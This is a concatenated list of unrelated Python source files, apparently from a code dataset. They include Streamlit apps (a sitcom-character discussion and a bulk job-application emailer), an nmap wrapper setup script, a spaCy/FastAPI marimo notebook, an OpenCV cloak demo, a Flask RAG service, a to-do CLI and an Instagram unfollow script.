discussion:\", \n    key=\"topic_input\",\n    height=100  # Initial height in pixels\n)\n\n# Character selection in sidebar\nst.sidebar.markdown(\"### Select Characters\")\nselected_characters = st.sidebar.multiselect(\n    \"Choose who participates:\",\n    [\"Sheldon\", \"Leonard\", \"Penny\", \"Howard\", \"Raj\"],\n    default=[\"Sheldon\", \"Leonard\", \"Penny\", \"Howard\"]\n)\n\n# Action buttons in sidebar\nst.sidebar.markdown(\"### Actions\")\nbutton_col1, button_col2 = st.sidebar.columns([1, 1])\n\n# Place buttons in columns for better alignment\nwith button_col1:\n    start_button = st.button(\"Start Discussion\", use_container_width=True)\nwith button_col2:\n    continue_button = st.button(\"Continue\", use_container_width=True)\n\n# Clear button spans full width\nclear_button = st.sidebar.button(\"Clear Discussion\", use_container_width=True, type=\"secondary\")\n\n# Sidebar footer\nst.sidebar.markdown(\"---\")\nst.sidebar.markdown(\"*dev by [lesteroliver](https://github.com/lesteroliver911)*\")\n\n# Initialize session state for chat history\nif 'messages' not in st.session_state:\n    st.session_state.messages = []\n\n# Character mapping\ncharacter_map = {\n    \"Sheldon\": sheldon,\n    \"Leonard\": leonard,\n    \"Penny\": penny,\n    \"Howard\": howard,\n    \"Raj\": raj\n}\n\ndef generate_response(agent, topic, topic_context):\n    \"\"\"Generate a response from an agent\"\"\"\n    response = cf.run(\n        \"Contribute to the discussion\",\n        agents=[agent],\n        context={\n            \"topic\": topic,\n            \"background_info\": topic_context\n        },\n        interactive=False,\n        instructions=\"Respond to the topic and previous comments in character. \"\n                    \"Use the provided background information to make relevant observations. \"\n                    \"Keep responses 1-2 paragraphs max.\"\n    )\n    \n    # Update to use imported analyze_sentiment\n    sentiment_score, sentiment_desc = analyze_sentiment(response)\n    \n    return {\n        \"text\": response,\n        \"sentiment_score\": sentiment_score,\n        \"sentiment_desc\": sentiment_desc\n    }\n\n# Handle Start Discussion\nif start_button and topic:\n    st.session_state.messages = []\n    topic_context = get_topic_context(topic)\n    \n    with st.spinner('Starting a new discussion...'):\n        for char_name in selected_characters:\n            agent = character_map[char_name]\n            response_data = generate_response(agent, topic, topic_context)\n            st.session_state.messages.append({\n                \"character\": char_name, \n                \"message\": response_data[\"text\"],\n                \"sentiment_score\": response_data[\"sentiment_score\"],\n                \"sentiment_desc\": response_data[\"sentiment_desc\"]\n            })\n\n# Handle Continue Discussion\nif continue_button and topic and len(st.session_state.messages) > 0:\n    topic_context = get_topic_context(topic)\n    \n    with st.spinner('Generating new responses...'):\n        for char_name in selected_characters:\n            agent = character_map[char_name]\n            response_data = generate_response(agent, topic, topic_context)\n            st.session_state.messages.append({\n                \"character\": char_name, \n                \"message\": response",
    "import json\nimport math\n\n\ndef read_jsonl_to_dicts(file_path):\n    data = []\n    with open(file_path, 'r', encoding='utf-8') as file:\n        for line in file:\n            data.append(json.loads(line))\n    return data\n\nfile_name_list = ['mmlu_0', 'mmlu_1', 'mmlu_2', 'mmlu_3', 'mmlu_4', 'mmlu_5', 'mmlu_6', 'mmlu_7']\nfor file_name in file_name_list:\n    entropys = read_jsonl_to_dicts('vicuna/finetune_method/my_method/generate_train_data/confidence/confidence_q/' + file_name + '_entropy.jsonl')\n    ratios = read_jsonl_to_dicts('vicuna/finetune_method/my_method/generate_train_data/confidence/confidence_qa/' + file_name + '_ratio.jsonl')\n    entropy_dict = {item['question_id']:item['entropy'] for item in entropys}\n    ratio_dict = {item['question_id']:item['ratio'] for item in ratios}\n    intersection_id_list = list(set(entropy_dict.keys()) & set(ratio_dict.keys()))\n    file_to_write = open(\n        'vicuna/finetune_method/my_method/generate_train_data/confidence/final_confidence/' + file_name + '_confidence_qa.jsonl', 'w')\n    for id in intersection_id_list:\n        ans_json = {\n            \"question_id\": id,\n            \"confidence\": float(math.pow(ratio_dict[id], 0.2) * math.exp(-entropy_dict[id] * 1.1)),\n        }\n        file_to_write.write(json.dumps(ans_json) + \"\\n\")\n",
    "import os\nimport subprocess\nfrom setuptools import setup, find_packages\n\ndef check_if_installed(command):\n    \"\"\"Check if a command is installed on the system.\"\"\"\n    try:\n        subprocess.check_output([command, '--version'], stderr=subprocess.STDOUT)\n        return True\n    except subprocess.CalledProcessError:\n        return False\n\n\ndef install_nmap():\n    \"\"\"Install nmap if not already installed.\"\"\"\n    if not check_if_installed('nmap'):\n        print(\"Installing nmap...\")\n        subprocess.check_call(['sudo', 'apt-get', 'install', '-y', 'nmap'])\n        print(\"nmap installation complete.\")\n    else:\n        print(\"nmap is already installed.\")\n\ndef install_python_requirements():\n    \"\"\"Force install Python requirements.\"\"\"\n    print(\"Installing Python requirements...\")\n    pip_install_cmd = [\n        'sudo', 'pip', 'install',\n        '--upgrade', 'pyinstaller', 'pyinstaller-hooks-contrib',\n        '--break-system-packages', '--root-user-action=ignore'\n    ]\n    \n    # Install basic requirements\n    subprocess.check_call(pip_install_cmd)\n\n    # Check and install requirements from requirements.txt\n    if os.path.exists('requirements.txt'):\n        pip_install_cmd = [\n            'sudo', 'pip', 'install', '-r', 'requirements.txt',\n            '--break-system-packages', '--root-user-action=ignore'\n        ]\n        subprocess.check_call(pip_install_cmd)\n\n    print(\"Python requirements installation complete.\")\n\ndef create_binary():\n    \"\"\"Create the binary using PyInstaller.\"\"\"\n    print(\"Creating binary from mynmap.py...\")\n    subprocess.check_call(['pyinstaller', '--onefile', '--name', 'mynmap', 'mynmap.py'])\n    print(\"Binary creation complete.\")\n\n    binary_path = os.path.join(os.getcwd(), 'dist', 'mynmap')\n    if os.path.exists(binary_path):\n        subprocess.check_call(['sudo', 'mv', binary_path, '/usr/local/bin/mynmap'])\n        print(\"Binary moved to /usr/local/bin/mynmap.\")\n    else:\n        print(\"Error: Binary not found after PyInstaller build.\")\n\ndef main():\n    \"\"\"Run the setup process.\"\"\"\n    install_nmap()\n    install_python_requirements()\n    create_binary()\n\nif __name__ == '__main__':\n    main()\n\nsetup(\n    name='mynmap',\n    version='0.2',\n    packages=find_packages(),\n    install_requires=[\n    ],\n    entry_points={\n        'console_scripts': [\n            'mynmap = mynmap:main',\n        ],\n    },\n)\n",
    "import marimo\n\n__generated_with = \"0.10.9\"\napp = marimo.App(width=\"medium\")\n\n\n@app.cell\ndef _(mo):\n    mo.md(\n        \"\"\"\n        # Notebook to prod\n\n        This notebook serves as a demonstration on how to deploy Marimo as a webapp that also carries an API. We will use spaCy as a motivating example. \n\n        ## Base usecase\n\n        You can use the textbox below to type any English text that you like. When you submit the text will be passed to a `en_core_web_sm` model to extract some entities together with some other linguisitc information. Note that this model is designed to be lightweight, not to be the most effective model out there.\n        \"\"\"\n    )\n    return\n\n\n@app.cell\ndef _(BaseModel, FastAPI, HTMLResponse, render, spacy):\n    # Load English language model\n    nlp = spacy.load(\"en_core_web_sm\")\n\n    # Initialize FastAPI app\n    app = FastAPI(\n        title=\"NLP API\",\n        description=\"A simple API for text analysis using spaCy\",\n        version=\"1.0.0\"\n    )\n\n    class TextInput(BaseModel):\n        text: str\n\n    def render_text(text_input: TextInput):\n        doc = nlp(text_input.text)\n        return render(doc, style=\"ent\")\n\n    @app.get(\"/health\")\n    @app.get(\"/healthz\")\n    def read_root():\n        return {\"status\": \"alive\"}\n\n    @app.post(\"/api/json\")\n    def analyze_text(input_data: TextInput):\n        return nlp(input_data.text).to_json()\n\n    @app.post(\"/api/viz\")\n    def analyze_text_viz(input_data: TextInput, response_model=HTMLResponse):\n        return HTMLResponse(content=render_text(input_data))\n    return (\n        TextInput,\n        analyze_text,\n        analyze_text_viz,\n        app,\n        nlp,\n        read_root,\n        render_text,\n    )\n\n\n@app.cell\ndef _(mo):\n    text_form = (\n        mo.md(\"{text_in}\")\n          .batch(text_in=mo.ui.text_area(label=\"Input text\", placeholder=\"Hi. My name is Vincent.\"))\n          .form()\n    )\n\n    text_form\n    return (text_form,)\n\n\n@app.cell\ndef _(mo):\n    mo.md(\"\"\"You can see a nice render of the extracted entities below.\"\"\")\n    return\n\n\n@app.cell\ndef _(TextInput, mo, render_text, text_form):\n    mo.Html(render_text(TextInput(text=text_form.value[\"text_in\"]))) if text_form.value else None\n    return\n\n\n@app.cell\ndef _(mo):\n    mo.md(\"\"\"The api can return this visualisation at `/api/viz` but you can also get the following json at `/api/json`.\"\"\")\n    return\n\n\n@app.cell\ndef _(nlp, text_form):\n    import json\n\n    json.dumps(nlp(text_form.value[\"text_in\"]).to_json(), indent=2) if text_form.value else None\n    return (json,)\n\n\n@app.cell\ndef _(mo):\n    mo.md(\n        \"\"\"\n        ## Production stuff\n\n        ### The webapp \n\n        The Marimo notebook contains the code to run this task, but it also has a FastApi app built in that re-uses all the helper functions. The notebook also has a cell that contains this line:\n\n        ```python\n        if mo.app_meta().mode == \"script\":\n            import uvicorn\n            uvicorn.run(app, host=\"0.0.0.0\", port=8080)\n        ```\n\n        That means that when you run the notebook as a script that it can start a server for you! This makes everything nice and self contained! Locally you can experiment away in a notebook and when you are ready to re-use these parts you don't need to move things into a seperate Python module, you can just deploy the server in the notebook as you would normally.\n\n        ### Tests\n\n        You can run a Marimo notebook with `python` to run it as a script but you can also add tests for `pytest`. This will allow you also have all sorts of tests attached to really keep the notebook self-contained. This notebook comes with some of these unit-tests added that check for a few basics on the FastApi app. The CI flow for this particular notebook is to \n\n        ### Docker \n\n        Because Marimo is just a Python script it is also pretty easy to come up with a `Dockerfile` to deploy the whole thing. The only thing that is a bit \"different\" about this setup is that one might usually prefer `uv` these days, but `uv` cannot download spaCy models just due to an upstream issue. That's why this file sticks to `pip` for now. \n\n        ```Dockerfile\n        FROM python:3.12\n        WORKDIR /app\n        COPY . .\n        EXPOSE 8080\n        RUN python -m venv venv && venv/bin/python -m pip install -r requirements.txt && venv/bin/python -m spacy download en_core_web_sm\n        CMD [\"venv/bin/python\", \"app.py\"]\n        ```\n\n        ### Want to do more? \n\n        There are loads of things that you can do on top of this demo. Feel free to fork it from [Github](https://github.com/koaning/marimo-deploy) and make some changes. \n\n        - Right now the repository assumes a deployment on [fly.io](fly.io) but you can also use the setup to deploy elsewhere, like Huggingface.\n        - You can choose to use a custom spaCy model that you trained yourself or many an LLM model like [GliNER](https://calmcode.io/shorts/gliner.py). Be aware that these kinds of models do require a fair bit more RAM so you ma",
    "import cv2\nimport numpy as np\nimport time\n\ndef create_background(cap, num_frames=30):\n    print(\"Capturing background. Please move out of frame.\")\n    backgrounds = []\n    for i in range(num_frames):\n        ret, frame = cap.read()\n        if ret:\n            backgrounds.append(frame)\n        else:\n            print(f\"Warning: Could not read frame {i+1}/{num_frames}\")\n        time.sleep(0.1)\n    if backgrounds:\n        return np.median(backgrounds, axis=0).astype(np.uint8)\n    else:\n        raise ValueError(\"Could not capture any frames for background\")\n\ndef create_mask(frame, lower_color1, upper_color1, lower_color2, upper_color2):\n    hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)\n    mask1 = cv2.inRange(hsv, lower_color1, upper_color1)\n    mask2 = cv2.inRange(hsv, lower_color2, upper_color2) if lower_color2 is not None else 0\n    mask = cv2.bitwise_or(mask1, mask2)\n    mask = cv2.morphologyEx(mask, cv2.MORPH_OPEN, np.ones((3, 3), np.uint8), iterations=2)\n    mask = cv2.morphologyEx(mask, cv2.MORPH_DILATE, np.ones((3, 3), np.uint8), iterations=1)\n    return mask\n\ndef apply_cloak_effect(frame, mask, background):\n    mask_inv = cv2.bitwise_not(mask)\n    fg = cv2.bitwise_and(frame, frame, mask=mask_inv)\n    bg = cv2.bitwise_and(background, background, mask=mask)\n    return cv2.add(fg, bg)\n\ndef select_color():\n    # Predefined HSV ranges for colors\n    colors = {\n        \"red\": [(0, 120, 70), (10, 255, 255), (170, 120, 70), (180, 255, 255)],\n        \"blue\": [(90, 50, 50), (130, 255, 255), None, None],\n        \"green\": [(40, 50, 50), (80, 255, 255), None, None],\n        \"yellow\": [(20, 100, 100), (30, 255, 255), None, None],\n    }\n\n    print(\"Select the color of your cloak:\")\n    for idx, color in enumerate(colors.keys(), 1):\n        print(f\"{idx}. {color.capitalize()}\")\n\n    choice = int(input(\"Enter the number corresponding to your choice: \"))\n    selected_color = list(colors.keys())[choice - 1]\n    print(f\"You selected: {selected_color.capitalize()}\")\n    return colors[selected_color]\n\ndef main():\n    print(\"OpenCV version:\", cv2.__version__)\n\n    # Ask the user to select a cloak color\n    lower_color1, upper_color1, lower_color2, upper_color2 = select_color()\n\n    cap = cv2.VideoCapture(0)\n    if not cap.isOpened():\n        print(\"Error: Could not open camera.\")\n        return\n\n    # Capture the background once (whether live or static)\n    try:\n        background = create_background(cap)\n    except ValueError as e:\n        print(f\"Error: {e}\")\n        cap.release()\n        return\n\n    print(\"Starting main loop. Press 'q' to quit.\")\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            print(\"Error: Could not read frame.\")\n            time.sleep(1)\n            continue\n\n        mask = create_mask(frame, lower_color1, upper_color1, lower_color2, upper_color2)\n        result = apply_cloak_effect(frame, mask, background)\n\n        cv2.imshow('Invisible Cloak', result)\n\n        if cv2.waitKey(1) & 0xFF == ord('q'):\n            break\n\n    cap.release()\n    cv2.destroyAllWindows()\n\nif __name__ == \"__main__\":\n    main()",
    "import argparse\nimport pathlib\nimport shutil\n\n\ndef copy_cheatsheet(cheatsheet, src, dst):\n    source_path = pathlib.Path(src).absolute()\n    destination_path = pathlib.Path(dst).absolute()\n\n    for source_file in sorted(source_path.glob(\"**/\" + cheatsheet + \".cheat\")):\n        destination_file = destination_path.joinpath(source_file.name)\n\n        if destination_file.exists():\n            print(\"Skip copying because file already exists: \", destination_file)\n        else:\n            print(\"Copy a cheatsheet: \", source_file)\n            shutil.copyfile(source_file, destination_file)\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(\n        description=\"Copy a cheatsheet from other repository\"\n    )\n    parser.add_argument(\"cheatsheet\", help=\"Cheetsheat name\")\n    parser.add_argument(\"source_path\", help=\"Path to a cheatsheet repository\")\n    parser.add_argument(\"destination_path\", help=\"Path to a destination directory\")\n\n    args = parser.parse_args()\n    copy_cheatsheet(args.cheatsheet, args.source_path, args.destination_path)\n",
    "import streamlit as st\nimport pandas as pd\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nimport time\n\n# Add sidebar with instructions\nwith st.sidebar:\n    st.header(\"How to Use\")\n    st.markdown(\"\"\"\n    ### Step 1: Prepare Your CSV File\n    - Create a CSV file with required columns:\n        - First name\n        - Email\n        - Company Name\n    - Additional columns are allowed\n    \n    ### Step 2: Configure SMTP\n    - For Gmail:\n        1. Use `smtp.gmail.com` as server\n        2. Use port `587`\n        3. [Create an App Password](https://myaccount.google.com/apppasswords)\n        4. Use your Gmail address and App Password\n    \n    ### Step 3: Upload and Verify\n    - Upload your CSV file\n    - Verify the preview shows correct data\n    \n    ### Step 4: Customize Email\n    - Edit the email subject\n    - Customize the message template\n    - Use `{First name}` to personalize emails\n    \n    ### Step 5: Send Emails\n    - Click 'Send Emails' button\n    - Monitor progress in the main window\n    - Wait for confirmation messages\n    \n    ### Tips\n    - Test with a small list first\n    - Check spam folder if emails not received\n    - Keep message template professional\n    \"\"\")\n\ndef send_email(smtp_server, smtp_port, sender_email, sender_password, recipient_email, subject, body, max_retries=3):\n    for attempt in range(max_retries):\n        try:\n            msg = MIMEMultipart()\n            msg['From'] = sender_email\n            msg['To'] = recipient_email\n            msg['Subject'] = subject\n            \n            msg.attach(MIMEText(body, 'plain'))\n            \n            with smtplib.SMTP(smtp_server, smtp_port, timeout=30) as server:\n                server.starttls()\n                server.login(sender_email, sender_password)\n                server.send_message(msg)\n                return True\n        except smtplib.SMTPServerDisconnected as e:\n            if attempt == max_retries - 1:  # Last attempt\n                st.error(f\"Failed to send email to {recipient_email} after {max_retries} attempts: Connection issue\")\n                return False\n            st.warning(f\"Connection issue, retrying... ({attempt + 1}/{max_retries})\")\n            time.sleep(2)  # Wait 2 seconds before retrying\n        except Exception as e:\n            st.error(f\"Failed to send email to {recipient_email}: {str(e)}\")\n            return False\n\nst.title(\"Geek Room Email Sender\")\n\n# File Upload\nuploaded_file = st.file_uploader(\"Upload CSV file\", type=\"csv\")\n\nif uploaded_file:\n    data = pd.read_csv(uploaded_file)\n    required_columns = {'First name', 'Email', 'Company Name'}\n    \n    # Check if required columns exist, regardless of additional columns\n    if required_columns.issubset(data.columns):\n        st.success(f\"CSV file successfully uploaded and validated. Found columns: {', '.join(data.columns)}\")\n        st.dataframe(data.head())\n    else:\n        missing_columns = required_columns - set(data.columns)\n        st.error(f\"Missing required columns: {', '.join(missing_columns)}\\nPlease ensure your CSV contains: {', '.join(required_columns)}\")\n        st.stop()\n\n# SMTP Details\nst.header(\"SMTP Configuration\")\nsender_email = st.text_input(\"Your Email\")\nsender_password = st.text_input(\"Your Email Password\", type=\"password\")\nsmtp_server = st.text_input(\"SMTP Server\", value=\"smtp.gmail.com\")\nsmtp_port = st.number_input(\"SMTP Port\", value=587)\n\n# Email Subject and Message\nst.header(\"Email Content\")\nsubject = st.text_input(\"Email Subject\", value=\"Exciting Opportunities in Machine Learning and LLMs\")\n\ndefault_template = (\n    \"Hi {First name},\\n\\n\"\n    \"I hope this message finds you well. I am writing to express my strong interest in roles related to \"\n    \"Machine Learning and Large Language Models (LLM) within your esteemed organization.\\n\\n\"\n    \"With a background in Computer Science and hands-on experience in AI research, I have a proven track \"\n    \"record in fine-tuning large language models and developing innovative AI solutions. My role as Co-founder \"\n    \"of Geek Room and internships at Superteams.ai, Quizzy, and Renix Informatics have honed my skills in \"\n    \"machine learning, leadership, and project management.\\n\\n\"\n    \"I am particularly excited about contributing to your initiatives in improving recommendation systems, \"\n    \"search algorithms, and natural language understanding. My projects, such as Dockerized-Whisper and Advocate Falcon, \"\n    \"along with specialized coursework in Supervised Machine Learning and Transformers.\\n\\n\"\n    \"I'm mentioning my proof of work with you:\\n\\n\"\n    \"My HuggingFace Spaces: https://huggingface.co/themanas021\\n\"\n    \"My Github: https://github.com/manas95826\\n\"\n    \"My Linkedin: https://www.linkedin.com/in/themanas95826/\\n\"\n    \"My docker container: Manas - https://hub.docker.com/u/themanas\\n\"\n    \"My Resume: https://drive.google.com/file/d/1v51ZCWmIwWXdyZer81Y9s8KANUouT6us/view?usp=drivesdk\\n\\n\"\n    \"Thank you for considering my appli",
    "from flask import Flask, request, jsonify\nimport time\nfrom langchain_groq import ChatGroq\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.chains.combine_documents import create_stuff_documents_chain\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain.chains import create_retrieval_chain\nfrom langchain_community.vectorstores import FAISS\nfrom langchain_community.document_loaders import PyPDFLoader\nfrom langchain_community.embeddings import OllamaEmbeddings\nfrom dotenv import load_dotenv\nimport os\n\napp = Flask(__name__)\nload_dotenv()\ngroq_api_key = os.getenv('groq_api')\n\n# Global variables\nvectors = None\nembeddings = None\nllm = ChatGroq(groq_api_key=groq_api_key, model_name=\"mixtral-8x7b-32768\")\n\nprompt = ChatPromptTemplate.from_template(\"\"\"\n    You are a document assistant that helps users find information in a context.\n    Please provide the most accurate response based on the context and inputs.\n    Only give information that is in the context, not in general.\n    \n    <context>\n    {context}\n    </context>\n    \n    Question: {input}\n\"\"\")\n\n@app.route('/process_document', methods=['POST'])\ndef process_document():\n    global vectors, embeddings\n    \n    if 'file' not in request.files:\n        return jsonify({'error': 'No file part'}), 400\n        \n    file = request.files['file']\n    if not file.filename.endswith('.pdf'):\n        return jsonify({'error': 'Invalid file type'}), 400\n        \n    try:\n        # Save temporary file\n        temp_path = \"temp_file.pdf\"\n        file.save(temp_path)\n        \n        # Process document\n        embeddings = OllamaEmbeddings(\n            model=\"nomic-embed-text\",\n            base_url=\"http://localhost:11434\"\n        )\n        \n        loader = PyPDFLoader(temp_path)\n        docs = loader.load()\n        \n        text_splitter = RecursiveCharacterTextSplitter(\n            chunk_size=1000,\n            chunk_overlap=200\n        )\n        \n        final_documents = text_splitter.split_documents(docs)\n        vectors = FAISS.from_documents(final_documents, embeddings)\n        \n        return jsonify({'message': 'Document processed successfully'})\n        \n    except Exception as e:\n        return jsonify({'error': str(e)}), 500\n        \n    finally:\n        if os.path.exists(temp_path):\n            os.remove(temp_path)\n\n@app.route('/query', methods=['POST'])\ndef query_document():\n    if not vectors:\n        return jsonify({'error': 'No document processed yet'}), 400\n    \n    data = request.get_json()\n    query = data.get('query')\n    \n    if not query:\n        return jsonify({'error': 'No query provided'}), 400\n    \n    try:\n        document_chain = create_stuff_documents_chain(llm, prompt)\n        retriever = vectors.as_retriever()\n        retrieval_chain = create_retrieval_chain(retriever, document_chain)\n        \n        start = time.process_time()\n        response = retrieval_chain.invoke({'input': query})\n        elapsed_time = time.process_time() - start\n        \n        return jsonify({\n            'answer': response['answer'],\n            'context': [doc.page_content for doc in response['context']],\n            'elapsed_time': elapsed_time\n        })\n    except Exception as e:\n        return jsonify({'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(port=5000)",
    "from datetime import datetime\nimport json\n\nclass TodoList:\n    def __init__(self):\n        self.tasks = []\n        self.filename = \"tasks.json\"\n        self.id_counter = 1  # Start the counter at 1\n        self.load_tasks()\n\n    def add_task(self, description):\n        \"\"\"Add a new task\"\"\"\n        task = {\n            'id': self.id_counter,  # Use the counter for the task ID\n            'description': description,\n            'completed': False,\n            'created_at': datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        }\n\n        self.tasks.append(task)\n        self.id_counter += 1  # Increment the counter\n        self.save_task()\n        print(f\"Task '{description}' added successfully!\")\n\n    def view_tasks(self):\n        \"\"\"Display all tasks\"\"\"\n        if not self.tasks:\n            print(\"\\nNo tasks found!\")\n            return\n\n        print(\"\\nYour To-Do List: \")\n        print(\"-\" * 50)\n        \n        for task in self.tasks:\n            status = \"\u2713\" if task['completed'] else \" \"\n            # 1. [ ] Build todo list app\n            # 2. [\u2713] Read book about python\n            print(f\"{task['id']}. [{status}] {task['description']}\")\n        print(\"-\" * 50)\n\n    def complete_task(self, task_id):\n        \"\"\"Mark a task as completed\"\"\"\n        # 1. Loop through tasks property\n        # 2. check for task_id\n        # 3. mark task['completed'] = true\n        for task in self.tasks:\n            if task['id'] == task_id:\n                task['completed'] = True\n                self.save_task()\n                print(f\"Task {task_id} marked as completed!\")\n                return\n        print(f\"Task with ID {task_id} not found!\")\n\n    def delete_task(self, task_id):\n        \"\"\"Delete a task\"\"\"\n        # 1. Loop through tasks property\n        # 2. Check for task_id in tasks property\n        # 3. remove task \n        for task in self.tasks:\n            if task['id'] == task_id:\n                self.tasks.remove(task)\n                self.save_task()\n                print(f\"Task {task_id} deleted!\")\n                return\n        print(f\"Task with ID {task_id} not found!\")\n\n    def save_task(self):\n        \"\"\"Save tasks to file\"\"\"\n        data = {\n            'tasks': self.tasks,\n            'id_counter': self.id_counter  # Save the counter\n        }\n        with open(self.filename, 'w') as file:\n            json.dump(data, file, indent=2)\n    \n    def load_tasks(self):\n        \"\"\"Load tasks from file if it exists\"\"\"\n        try:\n            with open(self.filename, 'r') as file:\n                data = json.load(file)\n                self.tasks = data.get('tasks', [])\n                self.id_counter = data.get('id_counter', 1) # Default to 1 if not found\n        except FileNotFoundError:\n            self.tasks = []\n            self.id_counter = 1\n\ndef main():\n    todo = TodoList()\n\n    while True:\n        print(\"\\n=== To-Do List Application ===\")\n        print(\"1. Add task\")\n        print(\"2. View task\")\n        print(\"3. Complete task\")\n        print(\"4. Delete task\")\n        print(\"5. Exit\")\n\n        choice = input(\"\\nEnter your choice (1-5): \")\n\n        if choice == '1':\n            description = input(\"Enter task description: \")\n            todo.add_task(description=description)\n        elif choice == '2':\n            todo.view_tasks()\n        elif choice == '3':\n            todo.view_tasks()\n            try:\n                task_id = int(input(\"Enter task ID to mark as completed: \"))\n                todo.complete_task(task_id=task_id)\n            except ValueError:\n                print(\"Please enter a valid task ID!\")\n        elif choice == '4':\n            todo.view_tasks()\n            try:\n                task_id = int(input(\"Enter task ID to delete: \"))\n                todo.delete_task(task_id=task_id)\n            except ValueError:\n                print(\"Please enter a valid task ID!\")\n        elif choice == '5':\n            print(\"Thank you for using the To-Do List Application!\")\n            break\n        else:\n            print(\"Invalid choice! Please try again.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "from instagrapi import Client\nimport time\nimport getpass  # \u0414\u043b\u044f \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0433\u043e \u0432\u0432\u043e\u0434\u0430 \u043f\u0430\u0440\u043e\u043b\u044f\n\n# \u041f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435\ndef show_banner():\n    print(\"=\" * 50)\n    print(\" \" * 15 + \"InstaCleaner\")\n    print(\"=\" * 50)\n    print(\"\u0418\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430\u043c\u0438 Instagram\")\n    print(\"\u0410\u0432\u0442\u043e\u0440: darkstar\")\n    print(\"=\" * 50)\n\n# \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\nshow_banner()\n\n# \u0410\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f\nusername = str(input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 Instanick: \"))\npassword = getpass.getpass(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 \u043f\u0430\u0440\u043e\u043b\u044c: \")  # \u0421\u043a\u0440\u044b\u0442\u0438\u0435 \u0432\u0432\u043e\u0434\u0430 \u043f\u0430\u0440\u043e\u043b\u044f\ncl = Client()\ntry:\n    cl.login(username, password)\n    print(\"\\n[\u2713] \u0423\u0441\u043f\u0435\u0448\u043d\u044b\u0439 \u0432\u0445\u043e\u0434 \u0432 \u0430\u043a\u043a\u0430\u0443\u043d\u0442!\")\nexcept Exception as e:\n    print(f\"\\n[!] \u041e\u0448\u0438\u0431\u043a\u0430 \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u0438: {e}\")\n    exit()\n\n# \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u043e\u0434\u043f\u0438\u0441\u0447\u0438\u043a\u043e\u0432 \u0438 \u043f\u043e\u0434\u043f\u0438\u0441\u043e\u043a\nprint(\"\\n[~] \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0435 \u043f\u043e\u0434\u043f\u0438\u0441\u0447\u0438\u043a\u043e\u0432 \u0438 \u043f\u043e\u0434\u043f\u0438\u0441\u043e\u043a...\")\ntry:\n    followers = cl.user_followers(cl.user_id)\n    following = cl.user_following(cl.user_id)\nexcept Exception as e:\n    print(f\"[!] \u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0438 \u0434\u0430\u043d\u043d\u044b\u0445: {e}\")\n    exit()\n\nprint(\"\\n[~] \u041d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0443...\")\nfor user_id, user_info in following.items():\n    if user_id in followers:\n        print(f\"[=] \u041f\u0440\u043e\u043f\u0443\u0441\u043a\u0430\u0435\u043c: {user_info.username} (\u041f\u043e\u0434\u043f\u0438\u0441\u0430\u043d \u043d\u0430 \u0432\u0430\u0441)\")\n    else:\n        print(f\"[x] \u041e\u0442\u043f\u0438\u0441\u043a\u0430 \u043e\u0442: {user_info.username}\")\n        try:\n            cl.user_unfollow(user_id)\n            print(f\"    [\u2713] \u0423\u0441\u043f\u0435\u0448\u043d\u043e \u043e\u0442\u043f\u0438\u0441\u0430\u043b\u0438\u0441\u044c \u043e\u0442 {user_info.username}\")\n        except Exception as e:\n            print(f\"    [!] \u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0435 {user_info.username}: {e}\")\n        time.sleep(5)  # \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043f\u0430\u0443\u0437\u0443 \u043c\u0435\u0436\u0434\u0443 \u0437\u0430\u043f\u0440\u043e\u0441\u0430\u043c\u0438\nprint(\"\\n[\u2713] \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430!\")\n",
